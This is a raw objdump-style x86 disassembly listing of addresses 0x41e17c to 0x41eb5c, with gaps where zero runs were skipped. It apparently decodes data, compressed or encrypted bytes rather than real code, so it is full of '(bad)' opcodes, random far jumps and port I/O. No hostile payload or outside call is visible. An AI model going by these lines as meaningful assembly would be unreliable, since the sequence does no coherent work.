  41e17c:	cmp    cl,BYTE PTR [edi+0x2f]
  41e17f:	pop    eax
  41e180:	dec    edx
  41e181:	dec    edi
  41e182:	das    
  41e183:	pop    eax
	...
  41e1ac:	add    BYTE PTR [eax],al
  41e1ae:	repnz and eax,0x25ff322d
  41e1b4:	sub    eax,0x2d25ff32
  41e1b9:	xor    bh,BYTE PTR [esi]
  41e1bb:	or     bl,dh
  41e1bd:	das    
  41e1be:	or     al,0xa
  41e1c0:	fisubr WORD PTR [edi]
  41e1c2:	or     al,0xfa
  41e1c4:	(bad)  [edi]
  41e1c6:	or     al,0xfa
  41e1c8:	and    eax,0x2cd70100
  41e1cd:	dec    esi
  41e1ce:	pop    ds
  41e1cf:	into   
  41e1d0:	sbb    dh,BYTE PTR [esi+0x23]
  41e1d3:	sbb    DWORD PTR [ebx],0x2f9f2a71
  41e1d9:	inc    edi
  41e1da:	sub    BYTE PTR [ecx+esi*1+0x169f2500],dl
  41e1e1:	outs   dx,BYTE PTR ds:[esi]
  41e1e2:	and    ebp,DWORD PTR [esi-0x61afce2b]
  41e1e8:	xor    BYTE PTR [esi+edi*1+0x7b],ch
  41e1ec:	adc    eax,0xda8ce155
  41e1f1:	xor    ecx,DWORD PTR [esi]
  41e1f3:	pusha  
  41e1f4:	xor    DWORD PTR [ecx-0x25],esp
  41e1f7:	pusha  
  41e1f8:	adc    eax,0x2a5ced00
  41e1fd:	je     0x41e1c8
  41e1ff:	push   edx
  41e200:	push   ss
  41e201:	arpl   dx,bp
  41e203:	jae    0x41e228
  41e205:	jb     0x41e1e9
  41e207:	popa   
  41e208:	xor    BYTE PTR [ebx-0x5f],dh
  41e20b:	pop    ebx
  41e20c:	xor    dh,BYTE PTR [ecx-0x6e]
  41e20f:	jl     0x41e249
  41e211:	push   eax
	...
  41e23a:	add    BYTE PTR [eax],al
  41e23c:	mov    cl,BYTE PTR [edx]
  41e23e:	xor    dh,BYTE PTR [ecx-0x56]
  41e241:	and    DWORD PTR [ecx],eax
  41e243:	push   ecx
  41e244:	test   eax,0x9f751514
  41e249:	and    BYTE PTR [eax],ch
  41e24b:	pop    esp
  41e24c:	adc    BYTE PTR [ebx],0x13
  41e24f:	xor    ah,BYTE PTR [edx-0x1e]
  41e252:	sub    al,0x73
  41e254:	popa   
  41e255:	sbb    ebp,DWORD PTR [edi]
  41e257:	jno    0x41e1eb
  41e259:	cld    
  41e25a:	xor    al,0x50
  41e25c:	mov    bl,BYTE PTR [ebx-0x51]
  41e25f:	xor    ch,BYTE PTR [edi-0x31]
  41e262:	call   0x4b17:0x8db46f03
  41e269:	mov    edx,0x9d6a2899
  41e26e:	mov    BYTE PTR ds:0x3188961e,dl
  41e274:	sbb    DWORD PTR [esp+ecx*4+0x7bab1215],edi
  41e27b:	sbb    BYTE PTR [ebx],ah
  41e27d:	mov    dl,0x55
  41e27f:	pop    ss
  41e280:	add    bl,BYTE PTR [ebp-0x6d05cbcd]
  41e286:	inc    esi
  41e287:	pop    ss
  41e288:	or     cl,al
  41e28a:	out    0x36,eax
  41e28c:	sbb    edi,DWORD PTR [ebp-0x371ee4c5]
  41e292:	inc    esp
  41e293:	inc    eax
  41e294:	add    BYTE PTR [edx-0x45f0bfc7],bh
  41e29a:	xor    eax,0x109ee229
  41e29f:	and    eax,0x0
	...
  41e2c8:	add    BYTE PTR [eax],al
  41e2ca:	shl    BYTE PTR [ebx-0x381eb3fa],cl
  41e2d0:	sbb    esi,DWORD PTR [ebx]
  41e2d2:	int3   
  41e2d3:	shr    DWORD PTR [ebx],0x4a
  41e2d6:	repnz stos BYTE PTR es:[edi],al
  41e2d8:	das    
  41e2d9:	xor    ecx,edi
  41e2db:	into   
  41e2dc:	out    0x36,eax
  41e2de:	stos   DWORD PTR es:[edi],eax
  41e2df:	mov    ecx,0xcd911afb
  41e2e4:	add    al,0x40
  41e2e6:	cmp    BYTE PTR [ecx+ebx*8-0x37517a2b],0x19
  41e2ee:	popf   
  41e2ef:	mov    bh,0xab
  41e2f1:	sub    al,0x71
  41e2f3:	scas   eax,DWORD PTR es:[edi]
  41e2f4:	mov    esi,0xbab4762a
  41e2f9:	pop    ss
  41e2fa:	xchg   ebx,eax
  41e2fb:	int    0xc0
  41e2fd:	aas    
  41e2fe:	and    BYTE PTR [edi-0x4f7a6700],0x71
  41e305:	mov    ch,0x3d
  41e307:	lods   al,BYTE PTR ds:[esi]
  41e308:	ins    DWORD PTR es:[edi],dx
  41e309:	(bad)
  41e30d:	fwait
  41e30e:	es lahf 
  41e310:	inc    esi
  41e311:	mov    BYTE PTR [ebx],ch
  41e313:	jnp    0x41e360
  41e315:	mov    BYTE PTR [edi],cl
  41e317:	mov    ds:0x9f2b8c65,al
  41e31c:	push   ecx
  41e31d:	mov    BYTE PTR [edi-0x42],dl
  41e320:	lods   eax,DWORD PTR fs:[esi]
  41e322:	bound  esp,QWORD PTR [edx-0x6cab8194]
  41e328:	addr16 pop edx
  41e32a:	inc    esi
  41e32b:	mov    al,0x72
  41e32d:	pusha  
	...
  41e356:	add    BYTE PTR [eax],al
  41e358:	(bad)  
  41e359:	cwde   
  41e35a:	push   esp
  41e35b:	cmp    DWORD PTR [edx],eax
  41e35d:	mov    al,0x71
  41e35f:	push   ebp
  41e360:	inc    edx
  41e361:	stos   DWORD PTR es:[edi],eax
  41e362:	pop    edi
  41e363:	cmp    ch,BYTE PTR [ebx]
  41e365:	enter  0x3b6d,0x26
  41e369:	pop    ebx
  41e36a:	dec    eax
  41e36b:	inc    esi
  41e36c:	dec    ebx
  41e36d:	(bad)  
  41e36e:	dec    esi
  41e36f:	dec    eax
  41e370:	sbb    DWORD PTR [esi-0x41b4c400],edi
  41e376:	jb     0x41e361
  41e378:	or     DWORD PTR [edx-0x37c5f392],edi
  41e37e:	popa   
  41e37f:	adc    edi,edi
  41e381:	mov    eax,0xb94ff974
  41e386:	outs   dx,BYTE PTR ds:[esi]
  41e387:	adc    BYTE PTR [edx-0x61],al
  41e38a:	inc    ebp
  41e38b:	and    DWORD PTR [ebp+0x70244cac],eax
  41e391:	pop    ebx
  41e392:	inc    edi
  41e393:	xlat   BYTE PTR ds:[ebx]
  41e394:	dec    edx
  41e395:	(bad)  
  41e396:	pop    edi
  41e397:	int    0x69
  41e399:	xchg   edi,eax
  41e39a:	fstp   TBYTE PTR [di]
  41e39d:	cdq    
  41e39e:	je     0x41e379
  41e3a0:	je     0x41e353
  41e3a2:	addr16 add cl,cl
  41e3a5:	jl     0x41e410
  41e3a7:	gs out 0x86,eax
  41e3aa:	imul   esp,DWORD PTR [esi-0x4d],0x62
  41e3ae:	pop    ebp
  41e3af:	jb     0x41e3b3
  41e3b1:	add    BYTE PTR [ebx+0x68],0xce
  41e3b5:	data16 ins BYTE PTR es:[edi],dx
  41e3b7:	gs mov ch,0x81
  41e3ba:	push   ebx
  41e3bb:	imul   eax,DWORD PTR [eax],0x0
	...
  41e3e5:	add    BYTE PTR [ecx-0x5b889487],bh
  41e3eb:	cmp    eax,0x70aa6f40
  41e3f0:	pop    ebp
  41e3f1:	outs   dx,BYTE PTR ds:[esi]
  41e3f2:	ret    
  41e3f3:	js     0x41e467
  41e3f5:	add    ah,dl
  41e3f7:	mov    ah,BYTE PTR [esi+0x74]
  41e3fa:	xor    BYTE PTR [ebp+0x72],bh
  41e3fd:	gs sti 
  41e3ff:	xchg   ebx,eax
  41e400:	push   0x618af469
  41e405:	jb     0x41e452
  41e407:	sub    DWORD PTR [ebx+0x74],0xfffffff6
  41e40b:	mov    ah,BYTE PTR [eax]
  41e40d:	inc    ebx
  41e40e:	call   0x9a34d84
  41e413:	jae    0x41e476
  41e415:	jb     0x41e47e
  41e417:	add    DWORD PTR [ebp+0x70],0x74656424
  41e41e:	xor    al,0x6f
  41e420:	add    BYTE PTR [ebx+0x2e],dl
  41e423:	arpl   WORD PTR [ecx+0x73],sp
  41e426:	or     edx,DWORD PTR [edi+0x5c]
  41e429:	dec    ecx
  41e42a:	daa    
  41e42b:	push   0x76436973
  41e430:	push   0x5b86505c
  41e435:	inc    esi
  41e436:	push   ebx
  41e437:	xchg   DWORD PTR [eax],eax
  41e439:	pop    esp
  41e43a:	xor    BYTE PTR [esi+0x6e],dh
  41e43d:	cs push cs
  41e43f:	mov    esp,DWORD PTR [ebp+0x0]
  41e442:	dec    ecx
  41e443:	je     0x41e4b3
  41e445:	imul   edi,DWORD PTR [esi],0x513832
	...
  41e473:	add    BYTE PTR [ecx-0x8],ch
  41e476:	xor    al,0x50
  41e478:	ds out dx,al
  41e47a:	dec    ecx
  41e47b:	push   edx
  41e47c:	test   BYTE PTR ds:[ebp+0x46],0x7a
  41e481:	sti    
  41e482:	xor    al,BYTE PTR [eax]
  41e484:	jge    0x41e46d
  41e486:	xor    al,0x43
  41e488:	js     0x41e488
  41e48a:	xor    BYTE PTR [eax],al
  41e48c:	outs   dx,DWORD PTR ds:[esi]
  41e48d:	cmc    
  41e48e:	dec    eax
  41e48f:	addr16 dec ebp
  41e491:	fisubr WORD PTR [edi]
  41e493:	jb     0x41e4dc
  41e495:	xor    dh,BYTE PTR [ebp*2+0x5f18be58]
  41e49c:	sub    al,0xd7
  41e49e:	cmp    al,0x45
  41e4a0:	and    bl,cl
  41e4a2:	and    bl,BYTE PTR [edi+0x1a]
  41e4a5:	in     eax,0x43
  41e4a7:	aas    
  41e4a8:	push   cs
  41e4a9:	outs   dx,DWORD PTR ds:[esi]
  41e4aa:	inc    eax
  41e4ab:	inc    ecx
  41e4ac:	adc    esp,DWORD PTR [esi-0x7e15b9d9]
  41e4b2:	in     al,0x35
  41e4b4:	pop    esi
  41e4b5:	jp     0x41e4e4
  41e4b7:	imul   ebx,DWORD PTR [ebx],0x76
  41e4ba:	xor    eax,DWORD PTR [ecx+0x12]
  41e4bd:	xchg   ecx,eax
  41e4be:	sub    eax,0x1292dc6c
  41e4c3:	add    BYTE PTR ds:0xe9742681,cl
  41e4c9:	push   edx
  41e4ca:	adc    ah,BYTE PTR [ebx-0x6]
  41e4cd:	js     0x41e4ff
  41e4cf:	ins    DWORD PTR es:[edi],dx
  41e4d0:	fcom   QWORD PTR [edx+0x30]
  41e4d3:	push   ecx
  41e4d4:	std    
  41e4d5:	jb     0x41e50b
  41e4d7:	inc    ebx
	...
  41e500:	add    BYTE PTR [eax],al
  41e502:	loop   0x41e578
  41e504:	pop    ss
  41e505:	je     0x41e4aa
  41e507:	js     0x41e541
  41e509:	push   eax
  41e50a:	pop    esi
  41e50b:	add    cl,ah
  41e50d:	dec    edi
  41e50e:	lods   al,BYTE PTR ds:[esi]
  41e50f:	inc    ecx
  41e510:	and    esp,DWORD PTR [ebx-0x53]
  41e513:	pop    ebx
  41e514:	fisubr DWORD PTR [ebx+ebp*4]
  41e517:	mov    cl,0xc8
  41e519:	das    
  41e51a:	jb     0x41e4c6
  41e51c:	stos   BYTE PTR es:[edi],al
  41e51d:	aaa    
  41e51e:	fwait
  41e51f:	mov    al,0xbb
  41e521:	and    DWORD PTR [ecx-0x33],esp
  41e524:	out    0x32,eax
  41e526:	imul   edi,DWORD PTR [ecx-0x326ee94d],0xffffffcc
  41e52d:	aas    
  41e52e:	sub    DWORD PTR [edi-0x507ede42],0xffffffba
  41e535:	inc    edx
  41e536:	sbb    DWORD PTR [ebx-0x3980c05c],ebp
  41e53c:	fwait
  41e53d:	sub    BYTE PTR [eax+0xae3b7a7],al
  41e543:	jnp    0x41e4f4
  41e545:	cs and eax,0xff349bb6
  41e54b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e54c:	xchg   BYTE PTR [esi],ch
  41e54e:	sbb    bh,BYTE PTR [ebp-0x53c1ee78]
  41e554:	push   esi
  41e555:	es adc cl,al
  41e558:	dec    eax
  41e559:	adc    bl,BYTE PTR ds:0x1b302e9f
  41e55f:	mov    ebp,0x9bef3048
  41e564:	sub    BYTE PTR [eax+eax*1],dh
	...
  41e58f:	add    ch,bh
  41e591:	sahf   
  41e592:	sub    bl,BYTE PTR [ecx]
  41e594:	jmp    0xf67b:0xe382db5
  41e59b:	jecxz  0x41e58e
  41e59d:	int3   
  41e59e:	push   ss
  41e59f:	es (bad) 
  41e5a2:	sbb    ch,BYTE PTR ds:0x3008b0e3
  41e5a8:	jmp    0x13af:0xd3382aa9
  41e5af:	and    bl,BYTE PTR [ecx-0x5ccd1837]
  41e5b5:	mov    ch,0x0
  41e5b7:	std    
  41e5b8:	push   eax
  41e5b9:	sahf   
  41e5ba:	jb     0x41e5c0
  41e5bc:	jle    0x41e556
  41e5be:	ins    BYTE PTR es:[edi],dx
  41e5bf:	(bad)  
  41e5c0:	pop    edi
  41e5c1:	sahf   
  41e5c2:	ins    BYTE PTR es:[edi],dx
  41e5c3:	mov    edx,0xac507e7c
  41e5c8:	dec    ecx
  41e5c9:	pushf  
  41e5ca:	jae    0x41e5a1
  41e5cc:	push   esi
  41e5cd:	xchg   ebp,eax
  41e5ce:	push   esp
  41e5cf:	cdq    
  41e5d0:	fld    QWORD PTR [esi-0x4ddf4ee0]
  41e5d6:	arpl   WORD PTR [ebp-0x41ab63ce],dx
  41e5dc:	adc    BYTE PTR [edi+0x5b2f8862],ch
  41e5e2:	push   ecx
  41e5e3:	mov    ds,WORD PTR [ebx]
  41e5e5:	(bad)  
  41e5e6:	jne    0x41e570
  41e5e8:	das    
  41e5e9:	mov    edx,0xb011a65c
  41e5ee:	bound  ecx,QWORD PTR [eax-0x57be5397]
	...
  41e61c:	add    BYTE PTR [eax],al
  41e61e:	ins    DWORD PTR es:[edi],dx
  41e61f:	call   0xa763:0xc746aa5c
  41e626:	imul   ebp,DWORD PTR [ebx-0x715ddee0],0xba584e72
  41e630:	jno    0x41e68c
  41e632:	push   ebp
  41e633:	mov    al,0x6e
  41e635:	dec    eax
  41e636:	dec    esi
  41e637:	lahf   
  41e638:	dec    edi
  41e639:	sub    dh,BYTE PTR [esi]
  41e63b:	mov    al,0x6d
  41e63d:	dec    ebp
  41e63e:	sbb    al,0x9e
  41e640:	jb     0x41e62b
  41e642:	sub    DWORD PTR [eax-0x61e3c194],ebx
  41e648:	ins    BYTE PTR es:[edi],dx
  41e649:	cmp    bh,bh
  41e64b:	jge    0x41e69d
  41e64d:	and    al,0xfe
  41e64f:	fwait
  41e650:	jae    0x41e66f
  41e652:	and    DWORD PTR [ebp-0x60c5c6ac],edx
  41e658:	inc    ebp
  41e659:	add    BYTE PTR [ebx+0x70],dl
  41e65c:	bound  esp,QWORD PTR [ecx+0x43]
  41e65f:	mov    WORD PTR [edi],?
  41e661:	inc    ecx
  41e662:	inc    edi
  41e663:	xchg   esi,eax
  41e664:	pop    esp
  41e665:	inc    ebx
  41e666:	sub    ah,BYTE PTR [esi+0x61]
  41e669:	inc    esi
  41e66a:	fisttp DWORD PTR [ecx+0x6ef55020]
  41e670:	add    BYTE PTR [eax+ebx*8+0x6d],bl
  41e674:	imul   esp,DWORD PTR [edx-0xa],0x6d
  41e678:	dec    edi
  41e679:	inc    ebx
  41e67a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e67b:	mov    DWORD PTR [ecx+0x5c],eax
  41e67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e67f:	fs je  0x41e6e7
	...
  41e6aa:	add    BYTE PTR [eax],al
  41e6ac:	cdq    
  41e6ad:	test   DWORD PTR [eax+0x20],edx
  41e6b0:	ret    
  41e6b1:	jo     0x41e727
  41e6b3:	gs out 0x7d,eax
  41e6b6:	aas    
  41e6b7:	jne    0x41e664
  41e6b9:	je     0x41e701
  41e6bb:	push   esp
  41e6bc:	xchg   DWORD PTR [ecx+0x5c],ebx
  41e6bf:	jae    0x41e703
  41e6c1:	xor    BYTE PTR [ecx+0x61],ah
  41e6c4:	cmp    ebx,DWORD PTR [edx+0x4f]
  41e6c7:	outs   dx,DWORD PTR ds:[esi]
  41e6c8:	mov    ecx,0x25617365
  41e6cd:	jne    0x41e72b
  41e6cf:	inc    esi
  41e6d0:	and    edi,DWORD PTR [ecx+0x6f]
  41e6d3:	push   0x5c507f69
  41e6d8:	xor    al,0x57
  41e6da:	dec    edi
  41e6db:	outs   dx,DWORD PTR ds:[esi]
  41e6dc:	stc    
  41e6dd:	bound  esi,QWORD PTR [ebx+0x61]
  41e6e0:	in     eax,0x75
  41e6e2:	pop    esp
  41e6e3:	inc    esi
  41e6e4:	adc    edi,DWORD PTR [edx+0x6f]
  41e6e7:	push   0x507f19
  41e6ec:	inc    esp
  41e6ed:	jo     0x41e755
  41e6ef:	je     0x41e719
  41e6f1:	jp     0x41e765
  41e6f3:	add    edx,DWORD PTR gs:[ebp+0x6f34616c]
  41e6fa:	inc    esi
  41e6fb:	pop    eax
  41e6fc:	test   BYTE PTR ds:[eax+0x34],al
  41e700:	ds jnp 0x41e731
  41e703:	jno    0x41e6b7
  41e705:	push   ebx
  41e706:	xor    BYTE PTR [ebx+ebx*4+0x40],ch
  41e70a:	inc    ebp
  41e70b:	pop    edi
  41e70c:	mov    dl,0x5a
  41e70e:	xor    al,0x5f
	...
  41e738:	add    BYTE PTR [eax],al
  41e73a:	stos   BYTE PTR es:[edi],al
  41e73b:	pop    edx
  41e73c:	add    al,0x70
  41e73e:	lahf   
  41e73f:	push   ds
  41e740:	sub    DWORD PTR [eax],eax
  41e742:	xchg   DWORD PTR [eax+edx*1],ecx
  41e745:	je     0x41e6e6
  41e747:	push   ss
  41e748:	sub    eax,0x15136e20
  41e74d:	push   0x7421ee3e
  41e752:	pop    edi
  41e753:	hlt    
  41e754:	sub    ebp,DWORD PTR [edx+eiz*2+0xf]
  41e758:	sldt   WORD PTR [edx+0x637429e1]
  41e75f:	loope  0x41e74b
  41e761:	arpl   WORD PTR [edi-0x1a],bx
  41e764:	add    BYTE PTR [edi+ebp*2-0x21],bl
  41e768:	sub    DWORD PTR [ecx+0x55],esp
  41e76b:	cld    
  41e76c:	and    al,0x5f
  41e76e:	xor    dh,BYTE PTR [edx]
  41e770:	cmp    eax,0x15c12748
  41e775:	ins    DWORD PTR es:[edi],dx
  41e776:	sub    al,0xcb
  41e778:	jmp    0x41e7dd
  41e77a:	pop    ds
  41e77b:	mov    BYTE PTR [ecx],0x5c
  41e77e:	add    BYTE PTR [esi+0x74267123],ah
  41e784:	cmp    al,0x50
  41e786:	jmp    0x237d:0xf85c0460
  41e78d:	jno    0x41e775
  41e78f:	imul   edi,DWORD PTR [eax+edx*2],0x12
  41e793:	inc    esi
  41e794:	add    DWORD PTR [eax+eax*1-0x65],ebx
  41e798:	sub    BYTE PTR [ebx+0x4],ah
  41e79b:	fwait
  41e79c:	sub    BYTE PTR [eax+eax*1+0x0],ch
	...
  41e7c8:	fistp  WORD PTR [edx-0x19]
  41e7cb:	aaa    
  41e7cc:	iret   
  41e7cd:	mov    cl,0x13
  41e7cf:	and    ebp,edx
  41e7d1:	mov    ecx,0xb5db2505
  41e7d6:	sbb    edx,ebp
  41e7d8:	mov    cl,0xae
  41e7da:	adc    eax,DWORD PTR [edx+edx*4]
  41e7dd:	leave  
  41e7de:	add    al,0x27
  41e7e0:	popf   
  41e7e1:	lods   eax,DWORD PTR ds:[esi]
  41e7e2:	sti    
  41e7e3:	push   ss
  41e7e4:	popf   
  41e7e5:	leave  
  41e7e6:	cmc    
  41e7e7:	and    BYTE PTR [eax+ecx*8-0x505ae3eb],cl
  41e7ee:	out    0x37,eax
  41e7f0:	mov    al,ds:0x8420c3b2
  41e7f5:	mov    dl,0xbb
  41e7f7:	daa    
  41e7f8:	cdq    
  41e7f9:	ins    DWORD PTR es:[edi],dx
  41e7fa:	mov    edi,0x9a5b6228
  41e7ff:	sub    ah,BYTE PTR [eax-0x39]
  41e802:	mov    esi,0x8bb66c24
  41e807:	inc    ecx
  41e808:	popa   
  41e809:	scas   eax,DWORD PTR es:[edi]
  41e80a:	mov    WORD PTR ds:0x248baf59,?
  41e810:	ds test al,0x86
  41e813:	and    DWORD PTR [edx-0x3c],ecx
  41e816:	mov    BYTE PTR ds:0x2cad9f1d,dl
  41e81c:	and    dh,BYTE PTR [esi-0x50e5d35f]
  41e822:	mov    bl,ah
  41e824:	(bad)  
  41e825:	scas   al,BYTE PTR es:[edi]
  41e826:	and    BYTE PTR [eax],0x28
  41e829:	(bad)  
  41e82a:	out    0x4c,eax
	...
  41e854:	add    BYTE PTR [eax],al
  41e856:	and    al,cl
  41e858:	push   ebx
  41e859:	and    eax,0x4036af1a
  41e85e:	sbb    ecx,ecx
  41e860:	out    0x4b,eax
  41e862:	jmp    0x41e82b
  41e864:	cmp    eax,DWORD PTR [ecx*1+0x3e1644c8]
  41e86b:	stos   DWORD PTR es:[edi],eax
  41e86c:	add    BYTE PTR [eax+0x49],cl
  41e86f:	retf   0x1900
  41e872:	and    eax,0xbe974c9
  41e877:	mov    eax,0xb82e0e6b
  41e87c:	and    BYTE PTR ds:0x3a00c913,ch
  41e882:	pop    edi
  41e883:	lods   eax,DWORD PTR ds:[esi]
  41e884:	jbe    0x41e892
  41e886:	dec    eax
  41e887:	jnp    0x41e8dd
  41e889:	add    BYTE PTR [edx-0x42],dl
  41e88c:	add    BYTE PTR [edx],bl
  41e88e:	pop    edi
  41e88f:	lods   eax,DWORD PTR ds:[esi]
  41e890:	jbe    0x41e896
  41e892:	xor    BYTE PTR [ecx-0x50d729b8],cl
  41e898:	add    BYTE PTR [edx-0x338952a2],bh
  41e89e:	sub    ecx,DWORD PTR [ecx-0x52e125ad]
  41e8a4:	add    BYTE PTR [edx-0x3b8952e2],bl
  41e8aa:	push   ebx
  41e8ab:	mov    DWORD PTR [eax-0x38],edx
  41e8ae:	dec    eax
  41e8af:	lods   al,BYTE PTR ds:[esi]
  41e8b0:	add    BYTE PTR [edx-0x738952e2],bl
  41e8b6:	sub    ecx,DWORD PTR [ecx+0x8e50]
	...
  41e8e4:	xor    ebp,DWORD PTR [edi-0x50e54700]
  41e8ea:	push   0x72be70e9
  41e8ef:	jg     0x41e94f
  41e8f1:	lods   eax,DWORD PTR ds:[esi]
  41e8f2:	push   esp
  41e8f3:	or     BYTE PTR [ebp-0x42],0x0
  41e8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8f8:	pop    edx
  41e8f9:	lods   al,BYTE PTR ds:[esi]
  41e8fa:	je     0x41e8c5
  41e8fc:	push   eax
  41e8fd:	mov    esi,0xad315f72
  41e902:	and    BYTE PTR [ecx],dh
  41e904:	push   edi
  41e905:	lods   al,BYTE PTR ds:[esi]
  41e906:	je     0x41e8f1
  41e908:	stc    
  41e909:	cdq    
  41e90a:	jno    0x41e961
  41e90c:	bound  ecx,QWORD PTR [ebx+0x4d350063]
  41e912:	popa   
  41e913:	jb     0x41e94c
  41e915:	mov    ch,BYTE PTR [edi+0x65]
  41e918:	and    eax,0x14614c5f
  41e91d:	dec    ebx
  41e91e:	and    BYTE PTR [ebx+0x42],dl
  41e921:	push   ecx
  41e922:	jbe    0x41e989
  41e924:	and    eax,0x24614d3f
  41e929:	push   eax
  41e92a:	add    BYTE PTR [esi+eax*2+0x50],cl
  41e92e:	je     0x41e950
  41e930:	push   esp
  41e931:	pop    edx
  41e932:	jb     0x41e9aa
  41e934:	inc    edx
  41e935:	push   ecx
  41e936:	and    BYTE PTR [eax+0x38],dl
  41e939:	push   ecx
  41e93a:	je     0x41e93c
  41e93c:	cmp    edi,DWORD PTR [esi+0x6f]
  41e93f:	je     0x41e988
  41e941:	jo     0x41e9a4
  41e943:	jb     0x41e936
  41e945:	pop    eax
  41e946:	jb     0x41e968
	...
  41e970:	add    BYTE PTR [eax],al
  41e972:	(bad)  
  41e973:	jl     0x41e9e9
  41e975:	push   0x735da1e7
  41e97a:	mov    bl,0x3d
  41e97c:	push   eax
  41e97d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41e97f:	dec    ebx
  41e980:	popa   
  41e981:	jb     0x41e9ba
  41e983:	imul   esi,DWORD PTR [ebp+0x70],0x2
  41e987:	pop    esi
  41e988:	inc    esi
  41e989:	push   esp
  41e98a:	xchg   edi,eax
  41e98b:	cmp    eax,0x84b1614b
  41e990:	arpl   WORD PTR [ecx-0x5d],sp
  41e993:	xor    BYTE PTR [edx+0x0],0xe1
  41e997:	mov    DWORD PTR [eax+0x20],edx
  41e99a:	in     al,0x82
  41e99c:	imul   ebp,DWORD PTR [ebp-0x4a],0x25656483
  41e9a3:	pop    esi
  41e9a4:	data16 je 0x41e9be
  41e9a7:	and    BYTE PTR [ebp+0x73],0xf3
  41e9ab:	inc    esp
  41e9ac:	jno    0x41ea26
  41e9ae:	repz pop esi
  41e9b0:	pop    esp
  41e9b1:	inc    edx
  41e9b2:	ds xchg edi,eax
  41e9b4:	sub    BYTE PTR [ebx+eiz*8-0x71],ch
  41e9b8:	xor    al,0x72
  41e9ba:	loope  0x41e94c
  41e9bc:	and    ah,BYTE PTR [eax]
  41e9be:	or     eax,0xe97422a9
  41e9c3:	mov    ds:0x3a3e6316,al
  41e9c8:	sbb    eax,0xe743ca5f
  41e9cd:	popa   
  41e9ce:	into   
  41e9cf:	push   esp
  41e9d0:	add    al,0x51
  41e9d2:	shr    DWORD PTR [ecx+0x10],1
  41e9d5:	jne    0x41e9d7
	...
  41e9ff:	add    BYTE PTR [edi+0x7c5c1d54],bl
  41ea05:	push   edx
  41ea06:	inc    edx
  41ea07:	push   esp
  41ea08:	mov    ss,WORD PTR [esi+0x46]
  41ea0b:	jae    0x41e99f
  41ea0d:	pop    esi
  41ea0e:	sbb    eax,0x16525e74
  41ea13:	ins    DWORD PTR es:[edi],dx
  41ea14:	mov    eax,ds:0x7245e128
  41ea19:	repnz xor al,0x4b
  41ea1c:	lahf   
  41ea1d:	sbb    esp,DWORD PTR [edi]
  41ea1f:	add    BYTE PTR [ebp+0x69741ef9],cl
  41ea25:	and    edx,DWORD PTR [ebx]
  41ea27:	arpl   WORD PTR [edx+0x526c0e04],cx
  41ea2d:	daa    
  41ea2e:	or     eax,0x27f94c50
  41ea33:	pushw  ds
  41ea35:	cmc    
  41ea36:	daa    
  41ea37:	push   dx
  41ea39:	shl    DWORD PTR [ecx],1
  41ea3b:	jb     0x41ea98
  41ea3d:	out    dx,al
  41ea3e:	inc    edx
  41ea3f:	jae    0x41ea6b
  41ea41:	mov    dh,0x1e
  41ea43:	je     0x41ea53
  41ea45:	mov    ah,0x28
  41ea47:	ins    DWORD PTR es:[edi],dx
  41ea48:	and    BYTE PTR [edx],ah
  41ea4a:	aas    
  41ea4b:	push   esp
  41ea4c:	push   cs
  41ea4d:	and    al,BYTE PTR [esp+ebp*2+0x27]
  41ea51:	fbld   TBYTE PTR [esi]
  41ea53:	je     0x41ea47
  41ea55:	pop    edx
  41ea56:	xor    al,0x25
  41ea58:	and    ecx,ecx
  41ea5a:	out    0x32,eax
  41ea5c:	adc    eax,ecx
  41ea5e:	pop    ebx
  41ea5f:	nop    DWORD PTR [ebp+0x3844]
	...
  41ea8e:	cld    
  41ea8f:	mov    ch,BYTE PTR ds:0x29970e30
  41ea95:	adc    edx,edx
  41ea97:	(bad)  
  41ea98:	dec    esp
  41ea99:	adc    BYTE PTR [esi],bl
  41ea9b:	mov    edi,DWORD PTR [ecx]
  41ea9d:	daa    
  41ea9e:	jecxz  0x41ea60
  41eaa0:	(bad)  
  41eaa1:	cmp    eax,0x473b8af2
  41eaa6:	into   
  41eaa7:	scas   al,BYTE PTR es:[edi]
  41eaa8:	add    BYTE PTR [edi],ah
  41eaaa:	test   al,0xac
  41eaac:	out    0x32,eax
  41eaae:	mov    ds:0x890efbc1,eax
  41eab3:	lods   eax,DWORD PTR ds:[esi]
  41eab4:	add    al,0x38
  41eab6:	jl     0x41ea66
  41eab8:	add    ebp,DWORD PTR [eax]
  41eaba:	popf   
  41eabb:	scas   eax,DWORD PTR es:[edi]
  41eabc:	pop    ss
  41eabd:	adc    ah,BYTE PTR [ebx+0x6ee3cdc8]
  41eac3:	enter  0xfc5,0x8b
  41eac7:	mov    edx,0x9d9a20d9
  41eacc:	aam    0x27
  41eace:	bound  edi,QWORD PTR [esi-0x3793cc45]
  41ead4:	into   
  41ead5:	sbb    eax,0x339ba11e
  41eada:	push   ds
  41eadb:	pushf  
  41eadc:	mov    ebx,0x9bc95d2c
  41eae1:	aaa    
  41eae2:	jnp    0x41ea8f
  41eae4:	xchg   ebx,eax
  41eae5:	sub    al,0x53
  41eae7:	leave  
  41eae8:	call   0x2b0f:0x85c80f03
  41eaef:	mov    edx,0x2079
	...
  41eb1c:	or     bl,BYTE PTR [ebp-0x74f5c269]
  41eb22:	add    cl,ch
  41eb24:	add    DWORD PTR [eax-0x43b38a8f],ebx
  41eb2a:	jno    0x41eb86
  41eb2c:	pop    ebx
  41eb2d:	(bad)  
  41eb2e:	outs   dx,BYTE PTR ds:[esi]
  41eb2f:	daa    
  41eb30:	push   ebx
  41eb31:	(bad)  
  41eb32:	arpl   cx,bp
  41eb34:	sub    al,0xc0
  41eb36:	je     0x41eb7c
  41eb38:	dec    ebp
  41eb39:	lahf   
  41eb3a:	cmp    eax,DWORD PTR [bp+si-0x60]
  41eb3e:	outs   dx,BYTE PTR ds:[esi]
  41eb3f:	cmp    cl,BYTE PTR [esi-0x68]
  41eb42:	ins    BYTE PTR es:[edi],dx
  41eb43:	inc    ebp
  41eb44:	(bad)  
  41eb45:	mov    edi,0x893df872
  41eb4a:	js     0x41eb60
  41eb4c:	push   ss
  41eb4d:	pop    ebx
  41eb4e:	pop    esp
  41eb4f:	cmp    dl,BYTE PTR [edi]
  41eb51:	cwde   
  41eb52:	jb     0x41eb71
  41eb54:	js     0x41eae5
  41eb56:	push   eax
  41eb57:	jmp    0x16b881cf
  41eb5c:	dec    esp
